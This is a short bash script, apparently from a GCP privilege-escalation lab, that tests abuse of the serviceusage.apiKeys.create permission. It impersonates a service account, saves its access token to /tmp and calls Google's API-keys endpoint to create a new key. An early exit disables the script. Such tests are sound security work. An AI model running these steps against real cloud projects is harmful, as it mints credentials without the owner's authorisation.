#!/bin/bash

echo "This technique only works with real users and not service accounts :("
exit 0

source lib/lib.sh

echo "================================================"
echo "Checking serviceusage.apiKeys.create"

enable_service "apikeys.googleapis.com"
modify_role "serviceusage.apiKeys.create"

gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" \
  auth print-access-token > /tmp/privesc_gcp

curl -X POST "https://apikeys.clients6.google.com/v1/projects/$PROJECT_ID/apiKeys?access_token=$(cat /tmp/privesc_gcp)"

# Cleaning
echo "You should see a token previous to this message"
read -p "Press any key to delete scenario... " -n1 -s
echo ""

rm /tmp/privesc_gcp
disable_service "apikeys.googleapis.com"

echo "================================================"
